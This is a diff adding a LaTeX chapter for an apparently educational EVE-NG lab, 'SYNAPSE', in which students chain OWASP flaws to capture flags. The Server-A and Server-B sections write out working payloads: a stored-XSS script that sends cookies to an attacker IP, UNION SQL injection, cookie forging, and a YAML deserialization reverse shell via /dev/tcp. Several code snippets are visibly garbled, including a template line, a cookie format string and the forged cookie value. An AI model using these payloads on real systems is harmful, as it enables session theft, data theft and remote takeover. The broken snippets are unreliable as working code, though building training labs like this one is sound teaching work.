@@ -1,0 +1,1137 @@
+\chapter{LAB2 --- Web Vulnerabilities: SYNAPSE Portal}
+
+\section{LAB2 --- Web Vulnerabilities · SYNAPSE}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.72\linewidth}@{}}
+\toprule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+\textbf{Difficulty} & Medium \\
+\textbf{Category} & Web App Security · OWASP Top 10 \\
+\textbf{Flags} & 3 \\
+\textbf{Est.\ time} & 90--150 min \\
+\textbf{Key skills} & XSS, cookie hijack, broken auth, SQL injection, YAML deserialization, RCE \\
+\textbf{Nodes} & pfSense · VyOS · Server-A (SYNAPSE Portal) · Server-B (DataVault) · Parrot OS \\
+\end{longtable}}
+
+\href{https://github.com/TheEgea/TFG/tree/main/src/eve-ng/configs/nodes/Lab2}{Lab folder on GitHub} \href{https://github.com/TheEgea/TFG/raw/main/src/eve-ng/topologies/LAB2-WebVulnerabilities-SYNAPSE.unl}{Download topology (.unl)} \href{../../assets/exercises/lab2-exercise.pdf}{Exercise sheet} \href{../../assets/exercises/lab2-solution.pdf}{Solution guide}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Scenario}
+
+\textbf{SYNAPSE Intelligence Corp} runs two internal web applications on a segmented network. The student is an external attacker who must chain five OWASP Top 10 vulnerabilities across both servers to achieve remote code execution and data exfiltration.
+
+The attack starts with stored XSS to steal an admin session cookie, pivots through broken authentication and SQL injection to reach Server-B credentials, and culminates in YAML deserialization for a full reverse shell.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Topology}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.95\textwidth]{lab2-topology.png}
+\caption{EVE-NG topology --- Lab 2}
+\end{figure}
+
+\begin{lstlisting}
+Homelab LAN (192.168.0.0/24)
+        |
+[pfSense-LAB2]  WAN: 192.168.0.x (DHCP)
+        |        LAN: 172.16.1.1/30
+[VyOS-LAB2]
+  eth0: 172.16.1.2/30   $\leftarrow$ uplink to pfSense
+  eth1: 192.168.30.1/24 $\leftarrow$ Net-DMZ (servers)
+  eth2: 10.0.40.1/24    $\leftarrow$ Net-Attackers (Parrot)
+        |
+  +-----+--------+            |
+[Server-A]    [Server-B]    [Parrot]
+192.168.30.10 192.168.30.20 10.0.40.10
+SYNAPSE Portal  DataVault    Attacker
+XSS+Auth+SQLi   YAML RCE
+\end{lstlisting}
+
+\subsection{Nodes}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.20\linewidth}
+  >{\raggedright\arraybackslash}p{0.20\linewidth}
+  >{\raggedright\arraybackslash}p{0.28\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
+\toprule\noalign{}
+\begin{minipage}[b]{\linewidth}\raggedright
+Node
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+OS
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+IP
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Role
+\end{minipage} \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+pfSense-LAB2 & pfSense CE & WAN: 192.168.0.x / LAN: 172.16.x.x & Perimeter firewall · UEFI boot \\
+VyOS-LAB2 & VyOS rolling & 172.16.1.2 / 192.168.30.1 / 10.0.40.1 & Router · NAT · DNS \\
+Server-A & Ubuntu Server 24.04 & 192.168.30.10 & SYNAPSE Portal --- Flask + nginx + victim bot \\
+Server-B & Ubuntu Server 24.04 & 192.168.30.20 & DataVault --- Flask + PyYAML deserialization \\
+Parrot & Parrot Security 6.4 & 10.0.40.10 (static) & Attacker \\
+\end{longtable}}
+
+\subsection{Network segments}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
+\toprule\noalign{}
+Segment & Subnet & Gateway & Purpose \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+Net-Link & 172.16.1.0/30 & 172.16.1.1 & pfSense $\leftrightarrow$ VyOS \\
+Net-DMZ & 192.168.30.0/24 & 192.168.30.1 & Server-A + Server-B \\
+Net-Attackers & 10.0.40.0/24 & 10.0.40.1 & Parrot attacker \\
+Homelab & 192.168.0.0/24 & 192.168.0.1 & WAN \\
+\end{longtable}}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Learning objectives}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\tightlist
+\item
+  Exploit stored XSS to steal a session cookie from a bot victim
+\item
+  Forge authentication tokens with broken auth (unsigned cookie manipulation)
+\item
+  Extract credentials via UNION-based SQL injection
+\item
+  Chain application vulnerabilities across multiple services
+\item
+  Achieve RCE through YAML insecure deserialization (\texttt{yaml.UnsafeLoader})
+\end{enumerate}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Vulnerability chain}
+
+\begin{lstlisting}
+Stored XSS $\rightarrow$ Cookie Hijack $\rightarrow$ Broken Auth $\rightarrow$ SQLi $\rightarrow$ SSH Pivot $\rightarrow$ YAML RCE $\rightarrow$ RCE
+\end{lstlisting}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.03\linewidth}
+  >{\raggedright\arraybackslash}p{0.18\linewidth}
+  >{\raggedright\arraybackslash}p{0.10\linewidth}
+  >{\raggedright\arraybackslash}p{0.41\linewidth}
+  >{\raggedright\arraybackslash}p{0.11\linewidth}@{}}
+\toprule\noalign{}
+\# & \begin{minipage}[b]{\linewidth}\raggedright
+Vulnerability
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+OWASP
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Location
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Flag
+\end{minipage} \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+1 & Stored XSS & A03 & \path{/comments} --- Jinja2 \texttt{\textbackslash{}\textbar{}\ safe} filter & --- \\
+2 & Cookie theft & A07 & \texttt{HttpOnly=False} session cookie & --- \\
+3 & Broken authentication & A07 & Unsigned \texttt{ID:ROLE:USERNAME} cookie & --- \\
+4 & UNION SQL Injection & A03 & \path{/search?q=} --- raw string concat & \textbf{FLAG 1} \\
+5 & SSH lateral movement & A01 & Server-B:22 --- SSH pivot with \path{monitor/M0nit0r2024} (SQLi dump) $\rightarrow$ \path{/home/monitor/flag.txt} & \textbf{FLAG 2} \\
+6 & YAML deserialization & A08 & Server-B \path{/preview} --- \texttt{yaml.UnsafeLoader} & --- \\
+7 & RCE via reverse shell & A08 & YAML \path{!!python/object/apply:os.system} & \textbf{FLAG 3} \\
+\end{longtable}}
+
+\subsection{Credentials}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.18\linewidth}
+  >{\raggedright\arraybackslash}p{0.28\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.14\linewidth}@{}}
+
+\toprule\noalign{}
+User & Password & System & Role \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+ubuntu & S3rv3rA & Server-A OS & SSH \\
+admin & Admin@Synapse2024 & Server-A Portal & admin \\
+guest & guest123 & Server-A Portal & guest \\
+ubuntu & S3rv3rB & Server-B OS & SSH \\
+operator & D4t4V4ult\#2024 & Server-B DataVault & operator \\
+lab2 & L4b2 & Parrot OS & SSH \\
+\end{longtable}}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Lab startup checklist}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  Run bridge script on EVE-NG host (after reboot):
+
+\begin{lstlisting}
+bash /usr/local/bin/lab2-bridges-up.sh
+\end{lstlisting}
+\item
+  Start SYNAPSE Portal on Server-A:
+
+\begin{lstlisting}
+sshpass -p S3rv3rA ssh ubuntu@192.168.30.10
+cd /opt/synapse && docker-compose up -d
+\end{lstlisting}
+\item
+  Start DataVault on Server-B:
+
+\begin{lstlisting}
+sshpass -p S3rv3rB ssh ubuntu@192.168.30.20
+cd /opt/datavault && sudo docker compose up -d
+\end{lstlisting}
+\item
+  Configure Parrot static IP (\path{10.0.40.10/24}, GW \path{10.0.40.1})
+
+  \begin{itemize}
+  \tightlist
+  \item
+    pfSense-LAB2 uses \textbf{UEFI boot} --- use \path{/usr/local/bin/pfsense-lab2-start.sh}
+  \item
+    Server-A uses \texttt{docker-compose} v1 (hyphen). Server-B uses \texttt{docker\ compose} v2 (space).
+  \item
+    Bridge IPs reset on EVE-NG host reboot --- always run the bridge script first.
+  \end{itemize}
+\end{enumerate}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Files}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+\begin{minipage}[b]{\linewidth}\raggedright
+File
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Description
+\end{minipage} \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+\href{https://github.com/TheEgea/TFG/raw/main/src/eve-ng/topologies/LAB2-WebVulnerabilities-SYNAPSE.unl}{\nolinkurl{LAB2-WebVulnerabilities-SYNAPSE.unl}} & EVE-NG topology --- import directly \\
+\href{https://github.com/TheEgea/TFG/tree/main/src/eve-ng/configs/nodes/Lab2/server-a}{\path{nodes/Lab2/server-a/}} & Flask app, nginx config, victim bot, docker-compose \\
+\href{https://github.com/TheEgea/TFG/tree/main/src/eve-ng/configs/nodes/Lab2/server-b}{\path{nodes/Lab2/server-b/}} & DataVault Flask app, docker-compose \\
+\href{https://github.com/TheEgea/TFG/tree/main/src/eve-ng/configs/nodes/Lab2/vyos}{\path{nodes/Lab2/vyos/}} & VyOS config.boot \\
+\end{longtable}}
+
+\section{LAB2 -- Infrastructure Reference}
+
+Complete infrastructure reference for LAB2 SYNAPSE Intelligence Corp.~For instructor/lab admin use.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Node inventory}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.17\linewidth}
+  >{\raggedright\arraybackslash}p{0.17\linewidth}
+  >{\raggedright\arraybackslash}p{0.17\linewidth}
+  >{\raggedright\arraybackslash}p{0.17\linewidth}
+  >{\raggedright\arraybackslash}p{0.17\linewidth}@{}}
+\toprule\noalign{}
+Node & EVE-NG ID & VNC Port & Image & Status \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+Parrot-Attacker & 1 & 32769 & linux-parrot-security-6.4 & Running \\
+VyOS-LAB2 & 2 & Telnet 32770 & vyos-2026.02.13-rolling & Running \\
+Server-A-SYNAPSE & 3 & 32771 & linux-ubuntu-server-24.04 & Running \\
+Server-B-SYNAPSE & 4 & 32772 & linux-ubuntu-server-24.04 & Running \\
+pfSense-LAB2 & 5 & 32773 & pfsense-ce & Running \\
+\end{longtable}}
+
+\subsection{Network addressing}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
+\toprule\noalign{}
+Network & Subnet & Bridge & Host IP \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+Net-Attackers & 10.0.40.0/24 & vnet0\_1 & 10.0.40.254 \\
+Net-DMZ & 192.168.30.0/24 & vnet0\_2 & 192.168.30.254 \\
+Net-Link (pfSense$\leftrightarrow$VyOS) & 172.16.1.0/30 & vnet0\_3 & --- \\
+\end{longtable}}
+
+\subsection{Credentials (full reference)}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.20\linewidth}
+  >{\raggedright\arraybackslash}p{0.20\linewidth}
+  >{\raggedright\arraybackslash}p{0.28\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
+\toprule\noalign{}
+\begin{minipage}[b]{\linewidth}\raggedright
+System
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+User
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Password
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Access
+\end{minipage} \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+EVE-NG host & root & SSH key id\_ed25519\_eve-ng & ssh eve-ng \\
+pfSense-LAB2 & admin & pfsense & VNC 32773 / SSH 192.168.0.x \\
+VyOS-LAB2 & vyos & vyos & Telnet 32770 \\
+Server-A OS & ubuntu & S3rv3rA & SSH 192.168.30.x \\
+Server-A Portal (admin) & admin & Admin@Synapse2024 & \url{http://192.168.30.x/login} \\
+Server-A Portal (guest) & guest & guest123 & \url{http://192.168.30.x/login} \\
+Server-B OS & ubuntu & S3rv3rB & SSH 192.168.30.x \\
+Server-B DataVault & operator & D4t4V4ult\#2024 & \url{http://192.168.30.x/login} \\
+Parrot OS & lab2 & L4b2 & SSH 10.0.40.x \\
+\end{longtable}}
+
+\subsection{Deployed applications}
+
+\subsubsection{Server-A --- SYNAPSE Intelligence Portal}
+
+\begin{itemize}
+\tightlist
+\item
+  \textbf{Path:} \path{/opt/synapse/}
+\item
+  \textbf{Stack:} Flask 3.x + SQLite + nginx + Playwright victim bot
+\item
+  \textbf{Command:} \texttt{cd\ /opt/synapse\ \&\&\ docker-compose\ up\ -d} (docker-compose v1.29.2)
+\item
+  \textbf{Containers:} \path{synapse_flask_1} (port 5000), \path{synapse_nginx_1} (port 80), \path{synapse_victim}
+\end{itemize}
+
+\begin{lstlisting}
+/opt/synapse/
+|---- app/
+|   |---- app.py           # Flask application (XSS, broken auth, SQLi, admin panel)
+|   |---- init_db.py       # DB schema + seed data (flags, credentials)
+|   |---- requirements.txt
+|   \---- templates/
+|       |---- login.html
+|       |---- portal.html  # main portal (reports)
+|       |---- comments.html # XSS sink
+|       |---- search.html  # SQLi sink
+|       |---- admin.html   # admin panel (FLAG#2 + Server-B creds)
+|       \---- forbidden.html
+|---- docker-compose.yml
+|---- nginx/default.conf
+\---- victim/victim.py     # Playwright bot (visits /comments every 20s)
+\end{lstlisting}
+
+\textbf{Database tables:}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Table & Contents \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+users & admin/Admin@Synapse2024, guest/guest123 (MD5 passwords) \\
+reports & 5 dummy intel reports \\
+comments & XSS sink --- rendered with \texttt{\textbackslash{}\textbar{}\ safe} filter \\
+admin\_users & FLAG \\
+classified\_intel & FLAG + operator/D4t4V4ult\#2024 \\
+\end{longtable}}
+
+\subsubsection{Server-B --- SYNAPSE DataVault}
+
+\begin{itemize}
+\tightlist
+\item
+  \textbf{Path:} \path{/opt/datavault/}
+\item
+  \textbf{Stack:} Flask + PyYAML 6.x (Docker Compose v2)
+\item
+  \textbf{Command:} \texttt{cd\ /opt/datavault\ \&\&\ sudo\ docker\ compose\ up\ -d}
+\item
+  \textbf{Container:} datavault-flask (port 80$\rightarrow$5000)
+\end{itemize}
+
+\begin{lstlisting}
+/opt/datavault/
+|---- app/
+|   |---- app.py           # Flask app (YAML UnsafeLoader vuln in /preview)
+|   \---- templates/
+|       |---- login.html
+|       |---- index.html
+|       \---- preview.html
+|---- data/
+|   \---- finalData.txt    # FLAG
+|---- uploads/             # user upload dir (runtime)
+\---- docker-compose.yml
+\end{lstlisting}
+
+\subsection{Lab startup procedure}
+
+\begin{lstlisting}
+# 1. EVE-NG host --- restore bridge IPs after reboot
+bash /usr/local/bin/lab2-bridges-up.sh
+
+# 2. Start pfSense (UEFI mode)
+/usr/local/bin/pfsense-lab2-start.sh
+
+# 3. Server-A
+sshpass -p S3rv3rA ssh ubuntu@192.168.30.x
+cd /opt/synapse && docker-compose up -d
+docker-compose ps   # flask, nginx, victim all Up
+
+# 4. Server-B
+sshpass -p S3rv3rB ssh ubuntu@192.168.30.x
+cd /opt/datavault && sudo docker compose up -d
+sudo docker compose ps  # datavault-flask Up
+
+# 5. Parrot --- apply static IP each session
+sudo ip addr add 10.0.40.x/24 dev ens4
+sudo ip route add default via 10.0.40.1
+\end{lstlisting}
+
+\subsection{Flags summary}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.20\linewidth}
+  >{\raggedright\arraybackslash}p{0.20\linewidth}
+  >{\raggedright\arraybackslash}p{0.28\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
+\toprule\noalign{}
+\begin{minipage}[b]{\linewidth}\raggedright
+\#
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Flag
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Location
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+How to reach
+\end{minipage} \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+1 & FLAG & admin\_users table & UNION SQLi on \path{/search} \\
+2 & FLAG & classified\_intel table & \path{/admin} with forged admin cookie \\
+3 & FLAG & \path{/app/data/finalData.txt} (Server-B) & YAML deserialization $\rightarrow$ reverse shell \\
+\end{longtable}}
+
+\section{LAB2 -- VyOS Router}
+
+VyOS-LAB2 provides routing between pfSense, the DMZ (Server-A, Server-B), and the attacker network (Parrot).
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Interfaces}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
+\toprule\noalign{}
+Interface & IP & Network & Description \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+eth0 & 172.16.x.x/30 & Net-Link & Uplink to pfSense LAN \\
+eth1 & 192.168.30.x/24 & Net-DMZ & Gateway for servers \\
+eth2 & 10.0.40.x/24 & Net-Attackers & Gateway for Parrot \\
+\end{longtable}}
+
+\subsection{Access}
+
+\begin{lstlisting}
+# Console only (SSH daemon not enabled by default after reboot):
+ssh eve-ng "telnet localhost 32770"
+# user: vyos / vyos
+\end{lstlisting}
+
+\begin{lstlisting}
+VyOS SSH daemon sometimes fails to respond after an EVE-NG host reboot despite being configured.
+Console access via telnet :32770 always works.
+\end{lstlisting}
+
+\subsection{NAT rules}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}@{}}
+\toprule\noalign{}
+Rule & Source & Action \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+10 & 10.0.40.0/24 & masquerade via eth0 \\
+20 & 192.168.30.0/24 & masquerade via eth0 \\
+\end{longtable}}
+
+\subsection{DNS forwarding}
+
+\begin{itemize}
+\tightlist
+\item
+  Listens on: \texttt{192.168.30.x}, \texttt{10.0.40.x}
+\item
+  Allows queries from: \path{192.168.30.0/24}, \path{10.0.40.0/24}
+\end{itemize}
+
+\subsection{Static host mappings}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Hostname & IP \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+attacker.lab2.internal & 10.0.40.x \\
+server-a.lab2.internal & 192.168.30.x \\
+server-b.lab2.internal & 192.168.30.x \\
+router.lab2.internal & 192.168.30.x \\
+\end{longtable}}
+
+\subsection{Default route}
+
+\begin{lstlisting}
+0.0.0.0/0 via 172.16.x.x (pfSense LAN)
+\end{lstlisting}
+
+\section{LAB2 -- Server-A (SYNAPSE Intelligence Portal)}
+
+Server-A hosts the SYNAPSE Intelligence Portal --- a deliberately vulnerable Flask web application deployed via Docker Compose.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Access}
+
+\begin{lstlisting}
+sshpass -p S3rv3rA ssh ubuntu@192.168.30.x
+# From EVE-NG host with bridge vnet0_2 active (IP 192.168.30.x/24)
+\end{lstlisting}
+
+\subsection{System}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Parameter & Value \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+OS & Ubuntu 24.04.3 LTS \\
+Hostname & server-a-synapse \\
+IP & 192.168.30.x/24 \\
+Gateway & 192.168.30.x (VyOS eth1) \\
+App path & /opt/synapse/ \\
+\end{longtable}}
+
+\subsection{Docker Compose stack}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
+\toprule\noalign{}
+Container & Image & Role & Port \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+\path{synapse_flask_1} & python:3.11-slim & Flask app & 5000 (internal) \\
+\path{synapse_nginx_1} & nginx:alpine & Reverse proxy & 80 (public) \\
+\path{synapse_victim} & \path{playwright/python:v1.58.0-noble} & Bot victim & --- \\
+\end{longtable}}
+
+\begin{lstlisting}
+cd /opt/synapse
+docker compose up -d
+docker compose ps
+\end{lstlisting}
+
+\subsection{Database schema (SQLite)}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Table & Contents \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+users & Login credentials (admin, guest) --- passwords MD5 \\
+reports & Intelligence reports (5 dummy rows) \\
+comments & User-submitted comments --- \textbf{XSS sink} \\
+admin\_users & Lateral movement creds (monitor / M0nit0r2024) + flag \\
+\end{longtable}}
+
+\subsection{\texorpdfstring{Vulnerability 1 --- Stored XSS ({\ttfamily /comments})}{Vulnerability 1 --- Stored XSS (/comments)}}
+
+Comments are rendered without sanitisation:
+
+\begin{lstlisting}
+<div class="body">}</div>
+\end{lstlisting}
+
+The session cookie has \texttt{HttpOnly=False}:
+
+\begin{lstlisting}
+resp.set_cookie('session',
+    f"::",
+    httponly=False)
+\end{lstlisting}
+
+\textbf{Exploit} --- post this comment to steal the victim bot's cookie:
+
+\begin{lstlisting}
+<script>
+fetch('http://10.0.40.x:8000/?c=' + encodeURIComponent(document.cookie));
+</script>
+\end{lstlisting}
+
+Start listener on Parrot first:
+
+\begin{lstlisting}
+python3 -m http.server 8000
+\end{lstlisting}
+
+The victim bot visits \path{/comments} every \textasciitilde20 seconds. The cookie arrives in the listener log within one cycle.
+
+\subsection{Vulnerability 2 --- Broken Authentication}
+
+The session cookie format is \texttt{ID:ROLE:USERNAME} with no cryptographic signature:
+
+\begin{lstlisting}
+parts = session.split(':')
+role = parts[1] if len(parts) > 1 else 'guest'
+\end{lstlisting}
+
+\textbf{Exploit} --- forge admin cookie in browser console:
+
+\begin{lstlisting}
+document.cookie = "session=1admin; path=/"
+\end{lstlisting}
+
+Immediately grants admin access without knowing the password.
+
+\subsection{\texorpdfstring{Vulnerability 3 --- UNION SQL Injection ({\ttfamily /search})}{Vulnerability 3 --- UNION SQL Injection (/search)}}
+
+The search route concatenates user input directly into the SQL query:
+
+\begin{lstlisting}
+query = "SELECT * FROM reports WHERE title LIKE '%" + q + "%'"
+\end{lstlisting}
+
+SQL errors are displayed in the browser. The \texttt{reports} table has 5 columns.
+
+\textbf{Exploit} --- dump \path{admin_users} table:
+
+\begin{lstlisting}
+' UNION SELECT 1,username,flag,password,5 FROM admin_users--
+\end{lstlisting}
+
+Returns: \texttt{FLAG} --- \textbf{FLAG \#1} plus credentials in the flag column.
+
+\subsection{Vulnerability 4 --- Admin Panel (Broken Access Control)}
+
+After forging the admin cookie, navigate to \path{/admin} --- only accessible to users with \texttt{role=admin}.
+
+The admin panel queries the \path{classified_intel} table and displays classified intelligence posts. One entry contains:
+
+\begin{itemize}
+\tightlist
+\item
+  \textbf{FLAG} --- \textbf{FLAG \#2}
+\item
+  Server-B DataVault credentials: \texttt{operator\ /\ D4t4V4ult\#2024}
+\end{itemize}
+
+\textbf{Exploit} --- with admin cookie active, browse to \path{/admin}.
+
+\subsection{Attack chain summary (Server-A)}
+
+\begin{lstlisting}
+1. POST XSS payload to /comments
+2. Wait ~20s -> victim cookie arrives on listener (python3 -m http.server 8000)
+3. Forge admin cookie (broken auth) -> access /portal and /search
+4. UNION SQLi on \path{/search} -> FLAG (FLAG #1)
+5. Browse /admin -> FLAG (FLAG #2)
+              -> Obtain: operator / D4t4V4ult#2024 (Server-B DataVault)
+6. Continue to Server-B DataVault -> YAML deserialization -> FLAG #3
+\end{lstlisting}
+
+\section{LAB2 -- Server-B (SYNAPSE DataVault)}
+
+Server-B hosts the SYNAPSE DataVault --- a Flask application with an intentional YAML insecure deserialization vulnerability (OWASP A08). The objective is to upload a malicious YAML file, trigger remote code execution via a reverse shell, and exfiltrate the final flag from \path{/app/data/finalData.txt}.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Access}
+
+\begin{lstlisting}
+sshpass -p S3rv3rB ssh ubuntu@192.168.30.x  # Server-B IP
+# From EVE-NG host with bridge vnet0_2 active (IP 192.168.30.x/24)
+\end{lstlisting}
+
+Web application accessible at: \path{http://192.168.30.x} (port 80)
+
+\subsection{System}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Parameter & Value \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+OS & Ubuntu 24.04.3 LTS \\
+Hostname & server-b-monitor \\
+IP & 192.168.30.x/24 \\
+Gateway & 192.168.30.x (VyOS eth1) \\
+App path & /opt/datavault/ \\
+\end{longtable}}
+
+\subsection{Docker stack}
+
+\begin{lstlisting}
+cd /opt/datavault && sudo docker compose up -d
+sudo docker compose ps   # datavault-flask Up, port 80->5000
+\end{lstlisting}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}@{}}
+\toprule\noalign{}
+Container & Image & Port \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+datavault-flask & python:3.11-slim & 80-\textgreater5000 \\
+\end{longtable}}
+
+\subsection{Application --- SYNAPSE DataVault}
+
+The DataVault is a file management portal for uploading and previewing corporate data files.
+
+\textbf{Credentials:} \texttt{operator} / \texttt{D4t4V4ult\#2024}\\
+(Found in Server-A admin panel after completing FLAG \#2)
+
+\textbf{Routes:} \textbar{} Route \textbar{} Description \textbar{} \textbar-------\textbar-------------\textbar{} \textbar{} \path{/} \textbar{} File listing \textbar{} \textbar{} \path{/login} \textbar{} Login form \textbar{} \textbar{} \path{/upload} \textbar{} File upload (PDF, TXT, YAML, YML) \textbar{} \textbar{} \texttt{/preview/\textless{}filename\textgreater{}} \textbar{} Preview uploaded file \textbar{} \textbar{} \texttt{/download/\textless{}filename\textgreater{}} \textbar{} Download uploaded file \textbar{}
+
+\subsection{Vulnerability --- YAML Insecure Deserialization (OWASP A08)}
+
+The preview route loads YAML files using \texttt{yaml.UnsafeLoader}:
+
+\begin{lstlisting}
+# VULNERABLE CODE --- intentional for lab
+parsed = str(yaml.load(raw, Loader=yaml.UnsafeLoader))
+\end{lstlisting}
+
+\texttt{yaml.UnsafeLoader} (equivalent to \texttt{yaml.load} without Loader argument) allows instantiation of arbitrary Python objects, including \texttt{os.system}. This enables unauthenticated remote code execution when previewing a crafted YAML file.
+
+\textbf{Why it is dangerous:} PyYAML's \path{!!python/object/apply:} tag calls any Python callable with attacker-controlled arguments. With \texttt{UnsafeLoader}, there is no restriction on which callables can be invoked.
+
+\textbf{Secure alternative:} \path{yaml.safe_load()} --- only parses standard YAML types.
+
+\subsection{Exploit --- Reverse Shell via YAML Upload}
+
+\subsubsection{Step 1 --- Start listener on Parrot}
+
+\begin{lstlisting}
+nc -lvnp 4444
+\end{lstlisting}
+
+\subsubsection{Step 2 --- Create malicious YAML payload}
+
+\begin{lstlisting}
+echo '!!python/object/apply:os.system ["bash -c '"'"'bash -i >& /dev/tcp/10.0.40.x/4444 0>&1'"'"'"]' > exploit.yml
+\end{lstlisting}
+
